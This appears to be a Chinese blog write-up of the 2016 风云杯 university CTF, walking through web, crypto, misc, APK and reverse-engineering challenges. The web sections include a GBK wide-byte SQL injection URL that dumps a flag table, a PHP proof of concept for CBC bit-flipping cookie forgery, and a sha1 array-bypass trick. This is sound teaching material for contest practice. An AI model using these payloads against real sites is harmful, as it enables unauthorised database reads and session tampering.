<p style="max-width:100%;height:auto;">通过备份文件<code style="max-width:100%;height:auto;">~</code>看到源码如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
$_GET[&amp;apos;myid&amp;apos;] = urldecode($_GET[&amp;apos;myid&amp;apos;]);

$flag = &amp;apos;xxxxxxxxxxxxxxxxx&amp;apos;;
if (isset($_GET[&amp;apos;name&amp;apos;]) and isset($_POST[&amp;apos;password&amp;apos;])) {

if ($_GET[&amp;apos;name&amp;apos;] == $_POST[&amp;apos;password&amp;apos;])

print &amp;apos;Your password can not be your name.&amp;apos;;

else if (sha1($_GET[&amp;apos;name&amp;apos;]) === sha1($_POST[&amp;apos;password&amp;apos;])&amp;($_GET[&amp;apos;myid&amp;apos;]==&amp;apos;anyun&amp;apos;))

die(&amp;apos;Flag: &amp;apos;.$flag);

else

print &amp;apos;sorry!&amp;apos;;

}
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">直接用数组绕过就可以了
payload如下：</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe7755e6ec75290000b1.png" style="max-width:100%;height:auto;"/><br/>
得到flag</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe7b55e6ec75290000b2.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web06"><strong>web 06</strong></h2>
<p style="max-width:100%;height:auto;">mysql宽字符注入，没有别的过滤，直接构造联合查询从系统表<code style="max-width:100%;height:auto;">information_schema</code>里面爆出表名和列名，这里注意下编码的转换就行了，别的没有什么坑点，该数据库下面有两个表<code style="max-width:100%;height:auto;">article,flag</code>，<code style="max-width:100%;height:auto;">flag</code>表里有两个字段<code style="max-width:100%;height:auto;">id,thisisflag</code>，最后给个<code style="max-width:100%;height:auto;">payload</code></p>
<pre><code class="sql language-sql" style="max-width:100%;height:auto;">http://139.129.166.67/5t5y6huj7j7/index.php?id=1%c0&amp;apos; and 1=2 union select 1,convert(group_concat(thisisflag) using gbk) from flag--+
</code></pre>
<p style="max-width:100%;height:auto;">然后的得到<code style="max-width:100%;height:auto;">flag</code>。
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe8255e6ec75290000b3.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web08"><strong>web 08</strong></h2>
<p style="max-width:100%;height:auto;">一道CBC字节翻转攻击，给个链接：http://drops.wooyun.org/tips/7828
根据文章写POC,代码如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
        //1234567890abcdef1234567890abcdef1234567890abcdef1234567890auid=9;123123123123
        $enc = "9pzE4775q38+wGl/FqNMfFM53Ra6wTKAGUykoeioOjKzlajhqgjsPjGiXVvkFF2BwdywFE67ELLaNuU5yS0kjiuETsjG0Jdk4LiwwBst8ig=";
        $enc = base64_decode($enc);
        echo "&lt;br&gt;".($enc)."&lt;br&gt;";
        $enc[47] = chr(ord($enc[47]) ^ ord("9") ^ ord ("1"));
        echo "&lt;br&gt;".($enc)."&lt;br&gt;"; 
        $c = base64_encode($enc);
        $d = urlencode($c);
        echo "Plaintext after attack : &lt;br&gt;$c&lt;br&gt;";
        echo "Plaintext after attack : &lt;br&gt;$d&lt;br&gt;";
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">得到如下：</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe8f55e6ec75290000b5.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">即</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">9pzE4775q38%2BwGl%2FFqNMfFM53Ra6wTKAGUykoeioOjKzlajhqgjsPjGiXVvkFF2JwdywFE67ELLaNuU5yS0kjiuETsjG0Jdk4LiwwBst8ig%3D
</code></pre>
<p style="max-width:100%;height:auto;">然后修改cookie直接提交，即获得flag</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe8955e6ec75290000b4.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web09"><strong>web 09</strong></h2>
<p style="max-width:100%;height:auto;">这道题一开始就跳转到了这里</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://139.129.166.67/sefrgtafgr/index.php?line=&amp;file=a2V5LnR4dA==
</code></pre>
<p style="max-width:100%;height:auto;">出现一堆没用的东西，对<code style="max-width:100%;height:auto;">file</code>解码是key.txt，换成<code style="max-width:100%;height:auto;">index.php</code>后发现，这里存在任意代码读取，不断修改line的值得到<code style="max-width:100%;height:auto;">index.php</code>完整代码如下：</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
error_reporting(0); 
$file=base64_decode(isset($_GET[&amp;apos;file&amp;apos;])?$_GET[&amp;apos;file&amp;apos;]:""); 
$line=isset($_GET[&amp;apos;line&amp;apos;])?intval($_GET[&amp;apos;line&amp;apos;]):0; 
if($file==&amp;apos;&amp;apos;) header("location:index.php?line=&amp;file=a2V5LnR4dA=="); 
$file_list = array( 
&amp;apos;0&amp;apos; =&gt;&amp;apos;key.txt&amp;apos;, 
&amp;apos;1&amp;apos; =&gt;&amp;apos;index.php&amp;apos;, 
); 
if(isset($_COOKIE[&amp;apos;key&amp;apos;]) &amp;&amp; $_COOKIE[&amp;apos;key&amp;apos;]==&amp;apos;an_yun_tec&amp;apos;){  
$file_list[2]=&amp;apos;thisis_key.php&amp;apos;; 
} 
if(in_array($file, $file_list)){ 
$fa = file($file); 
echo $fa[$line]; 
} 
?&gt;
</code></pre>
<p style="max-width:100%;height:auto;">然后审计下构造如下请求：
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe9655e6ec75290000b6.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">于是得到flag是<code style="max-width:100%;height:auto;">KEY{key_anyuntec_co0kies}</code>。 </p>
<h2 id="crypto01"><strong>CRYPTO 01</strong></h2>
<p style="max-width:100%;height:auto;">一道培根加密，
原文是</p>
<pre><code style="max-width:100%;height:auto;">woUld you prEfeR SausaGes or bacoN  wiTH YouR EgG?
</code></pre>
<p style="max-width:100%;height:auto;">换过来变成</p>
<pre><code style="max-width:100%;height:auto;">aabaa aaaaa baabb aaaab aaaaa aaaba abbba abbab
</code></pre>
<p style="max-width:100%;height:auto;">百度百科里的第一个表，换成答案就是</p>
<pre><code style="max-width:100%;height:auto;">eatbacon
</code></pre>
<h2 id="misc01">misc 01</h2>
<p style="max-width:100%;height:auto;">winhex打开得到的JPG图片，在文件exif发现一串可疑字符ZmxhZ3tsdW9fcm9vbX0，加上=base64解码后得到
<code style="max-width:100%;height:auto;">flag{luo_room}</code></p>
<h2 id="misc02">misc 02</h2>
<p style="max-width:100%;height:auto;">解压后得到jpg图像，从图像的文件结尾后抠出了一个zip压缩包，判断了一下不是伪加密，根据提示银行卡密码，用工具暴力破了一下，得到了文件密码，解压后得到了flag.txt
<code style="max-width:100%;height:auto;">KEY{luffy_and_jet}</code></p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbe9c55e6ec75290000b7.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="misc03">misc 03</h2>
<p style="max-width:100%;height:auto;">解压后得到一张jpg，用winhex看了一下头部 直接得到flag···什么鬼···</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbea155e6ec75290000b8.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="misc06">misc 06</h2>
<p style="max-width:100%;height:auto;">观察了一下数据包，是ftp传输，有几个包特别显眼如下：
<br/><img alt="图片标题" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/getImagefileId=57372cbfab64413fd700f133" style="max-width:100%;height:auto;"/><br/>
把他们都用winhex抠出来，data3是一个带加密的zip文件，data5说社社会工程学说，很多用户习惯于用一样的密码。试了一下其他几个data中的密码都不对，重新去观察数据包，观察到下图中的包：
<br/><img alt="图片标题" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/getImagefileId=57372d8aab644141b100f034" style="max-width:100%;height:auto;"/><br/>
得到密码whoami127.0.0.1，尝试解压，成功！得到<code style="max-width:100%;height:auto;">KEY{351d5ead1ca31ed33deb6f6a3111e117}</code></p>
<h2 id="apk01">apk 01</h2>
<p style="max-width:100%;height:auto;">打开zip文件发现需要密码，立马反应到这是伪加密</p>
<p style="max-width:100%;height:auto;">为了偷懒把他的加密位用网上的脚本将一改成零即可</p>
<p style="max-width:100%;height:auto;">apk变成普通的apk后再按正常步骤：</p>
<p style="max-width:100%;height:auto;">在<code style="max-width:100%;height:auto;">AndroidManifest.xml</code>文件中可以发现</p>
<pre><code style="max-width:100%;height:auto;">//KEY{f2b0590b558a08514e1c497d400d08ba}
</code></pre>
<h2 id="apk03">apk 03</h2>
<p style="max-width:100%;height:auto;">这哈哈都写出来了，明显是忽悠人的。。。</p>
<p style="max-width:100%;height:auto;">在<code style="max-width:100%;height:auto;">FlagActivity</code>里能看到</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">    int[] arrayOfInt = { 75, 69, 89, 123, 97, 119, 52, 110, 110, 52, 95, 107, 52, 114, 95, 109, 120, 95, 100, 51, 120, 125 };
</code></pre>
<p style="max-width:100%;height:auto;">ascii码转换一下就是答案</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">    KEY{aw4nn4_k4r_mx_d3x}
</code></pre>
<h2 id="apk04">apk 04</h2>
<p style="max-width:100%;height:auto;">函数有点多，看着有点蛋疼，全都看一遍就好了，其实并不难。</p>
<p style="max-width:100%;height:auto;">纯分析的话不用写一行代码就能做出这道题，下面我把我分析的步骤都写出来，具体分析步骤如下</p>
<p style="max-width:100%;height:auto;">在<code style="max-width:100%;height:auto;">uc</code>这个class里比较显眼</p>
<pre><code style="max-width:100%;height:auto;">public static String nj = "XRL}D6hy4yfE7tuF6{";
</code></pre>
<p style="max-width:100%;height:auto;">这个太扎眼了，一眼就能看出来</p>
<p style="max-width:100%;height:auto;">因为看过前面的函数有印象：</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">while (true)
{
str = str + c;
i++;
break;
if ((j &gt;= 65) &amp;&amp; (j &lt;= 77))
c = (char)(j + 13);
else if ((j &gt;= 110) &amp;&amp; (j &lt;= 122))
c = (char)(j - 13);
else if ((j &gt;= 78) &amp;&amp; (j &lt;= 90))
c = (char)(j - 13);
else if ((j &gt;= 48) &amp;&amp; (j &lt;= 57))
c = (char)(j ^ 0x7);
else
c = (char)(j ^ 0x6);
}
</code></pre>
<p style="max-width:100%;height:auto;">两个大括号反过来了就是因为这里的</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">else
c = (char)(j ^ 0x6);
</code></pre>
<p style="max-width:100%;height:auto;">else就是除了数字和字母之外的字符
和<code style="max-width:100%;height:auto;">0x6</code>异或刚好就把最低位反过来然后括号反过来了</p>
<p style="max-width:100%;height:auto;">然后调用函数的时候:</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">uc.bh(cc.encrypt(str1), ca.encrypt(str1), cb.encode(str1));
</code></pre>
<p style="max-width:100%;height:auto;">之后：</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">public static boolean bh(String paramString1, String paramString2, String paramString3)
{
String str = paramString1 + paramString2 + paramString3;
</code></pre>
<p style="max-width:100%;height:auto;">可见他用了三个函数，但是因为前面分析的括号可知研究第一个加密函数就可以了</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">public static String encrypt(String paramString)
{
String str = "";
int i = 0;
if (i &gt;= paramString.length())
return str;
int j = paramString.charAt(i);
char c;
if ((j &gt;= 97) &amp;&amp; (j &lt;= 109))
c = (char)(j + 13);
while (true)
{
str = str + c;
i++;
break;
if ((j &gt;= 65) &amp;&amp; (j &lt;= 77))
c = (char)(j + 13);
else if ((j &gt;= 110) &amp;&amp; (j &lt;= 122))
c = (char)(j - 13);
else if ((j &gt;= 78) &amp;&amp; (j &lt;= 90))
c = (char)(j - 13);
else if ((j &gt;= 48) &amp;&amp; (j &lt;= 57))
c = (char)(j ^ 0x7);
else
c = (char)(j ^ 0x6);
}
}
</code></pre>
<p style="max-width:100%;height:auto;">这个函数的意思一看便懂：上半边字母表和下半边字母表对换
数字的话异或一下，还原出来就是：</p>
<pre><code style="max-width:100%;height:auto;">XRL}D6hy4yfE7tuF6{ --&gt;
KEY{Q1ul3lsR0ghS1}
</code></pre>
<h2 id="re01">re 01</h2>
<p style="max-width:100%;height:auto;">首先通过PEID查看，发现是upx壳，在机脱失败后，直接采取手脱，到达程序入口。</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbec055e6ec75290000b9.png" style="max-width:100%;height:auto;"/><br/>
发现本题是简单的字符串比较，并不存在什么难点
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbec455e6ec75290000ba.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">得到flag。
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbecb55e6ec75290000bb.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="re03">re 03</h2>
<p style="max-width:100%;height:auto;">加载进OD观察下，发现没有加壳，需要输入用户名和密码：</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbed155e6ec75290000bc.png" style="max-width:100%;height:auto;"/><br/>
两个对于长度有一些限制，用户名可以直接得到</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbed555e6ec75290000bd.png" style="max-width:100%;height:auto;"/><br/>
对于密码则采用了异或比较的方式：
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbed955e6ec75290000be.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">写个脚本模拟一下：
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbedf55e6ec75290000bf.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">得到结果：
McDull@Aun
YuyuMyl@ve!</p>
<h2 id="re04">re 04</h2>
<p style="max-width:100%;height:auto;">用od加载发现有反调试，于是用ida加载进来，观察了一下函数的基本结构。
主体就是简单的for循环，在特定时候调用输出函数，所以我们只要模拟下就行了。</p>
<pre><code class="c language-c" style="max-width:100%;height:auto;">    #include"stdio.h"

    __int8 byte_40336D,byte_40336F,byte_40336E,byte_40336C;

    int sub_401920()
    {
      return printf(
               "%c%c%c%c",
               (unsigned __int8)byte_40336D,
               (unsigned __int8)byte_40336F,
               (unsigned __int8)byte_40336E,
               (unsigned __int8)byte_40336C);
    }

    int __cdecl sub_401960(int a1)
    {
      signed int v2; // [sp+0h] [bp-10h]@5
      signed int v3; // [sp+4h] [bp-Ch]@7
      signed int v4; // [sp+8h] [bp-8h]@3
      signed int v5; // [sp+Ch] [bp-4h]@1



      byte_40336D = *(__int8 *)a1;
      byte_40336F = *(__int8 *)(a1 + 1);
      byte_40336E = *(__int8 *)(a1 + 2);
      byte_40336C = *(__int8 *)(a1 + 3);
      v5 = 5;
      do
      {
        byte_40336D += v5;
        byte_40336D ^= 3u;
        --v5;
      }
      while ( v5 );
      v4 = 4;
      do
      {
        byte_40336F += v4;
        byte_40336F ^= 4u;
        --v4;
      }
      while ( v4 );
      v2 = 3;
      do
      {
        byte_40336E += v2;
        byte_40336E ^= 5u;
        --v2;
      }
      while ( v2 );
      v3 = 2;
      do
      {
        byte_40336C += v3;
        byte_40336C ^= 6u;
        --v3;
      }
      while ( v3 );
      return 0;
    }

    int __cdecl sub_401A70(int a1)
    {
      int result; // eax@1
      unsigned int l; // [sp+0h] [bp-1Ch]@7
      unsigned int k; // [sp+4h] [bp-18h]@5
      unsigned int i; // [sp+8h] [bp-14h]@1
      char v5; // [sp+Ch] [bp-10h]@9
      char v6; // [sp+Dh] [bp-Fh]@9
      char v7; // [sp+Eh] [bp-Eh]@9
      char v8; // [sp+Fh] [bp-Dh]@9
      unsigned int j; // [sp+10h] [bp-Ch]@3
      int v10; // [sp+14h] [bp-8h]@1
      int v11; // [sp+18h] [bp-4h]@1

      v10 = 0;
      v11 = 0;
      for ( i = 0; i &lt;= 0xFF; ++i )
      {
        printf("^");
        for ( j = 0; j &lt;= 0xFF; ++j )
        {
          for ( k = 0; k &lt;= 0xFF; ++k )
          {
            for ( l = 0; l &lt;= 0xFF; ++l )
            {
              ++v10;
              v5 = j;
              v6 = i;
              v7 = l;
              v8 = k;

              char arry[4];
              arry[0]=v5;
              arry[1]=v6;
              arry[2]=v7;
              arry[3]=v8;
              if ( v10 == a1 )
              {
                  sub_401960((int)arry);
                  sub_401920();
              }

            }
          }
        }
        result = i + 1;
      }
      return result;
    } 

    int __cdecl main()
    {
      sub_401A70(1147021405);
      sub_401A70(942305638);
      sub_401A70(493974365);
      sub_401A70(942764337);
      printf("\n不是这里       ..什么也没有    \n");
      return 0;
    }
</code></pre>
<p style="max-width:100%;height:auto;"><br/>
模拟结果如下，得到答案：
<br/><img alt="" data-action="zoom" src="./2016风云杯大学生信安大赛-WriteUp/586dbeed55e6ec75290000c0.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">flag：jN<em>+6Bnp?</em>rGB;p</p>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>
</article>
</div>
<div class="unit one-fifth hide-on-mobiles godness">
<aside>
<div class="Bendawang" id="Bendawang" style="position:absolute;">
<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
<div class="Bendawang_content" id="Bendawang_content"></div>

<img class="yukino" id="yukino" src="./2016风云杯大学生信安大赛-WriteUp/41.png" style="position:absolute;"/>




<footer>
<div class="show-on-mobiles">
<div style="display:inline-block">
<div style="vertical-align:middle;">
            Copyright©
            <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
</div>
</div>
<div style="vertical-align:middle;">
<span>Designed By</span>
<a href="http://blog.csdn.net/qq_19876131"><img src="./2016风云杯大学生信安大赛-WriteUp/bendawang2.png"/></a>
</div>
</div>
<div class="grid hide-on-mobiles">
<div class="unit one-third center-on-mobiles">
<div class="copyright">
          Copyright©
          <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
</div>
</div>
<div class="unit two-thirds align-right center-on-mobiles">
<p>Designed By
          <a href="http://blog.csdn.net/qq_19876131">
<img src="./2016风云杯大学生信安大赛-WriteUp/bendawang2.png"/>
</a>
</p>
</div>
</div>
</footer>
<script src="./2016风云杯大学生信安大赛-WriteUp/prism.js"></script>
<script src="./2016风云杯大学生信安大赛-WriteUp/zooming.js"></script>
<script src="./2016风云杯大学生信安大赛-WriteUp/Bendawang.js"></script>


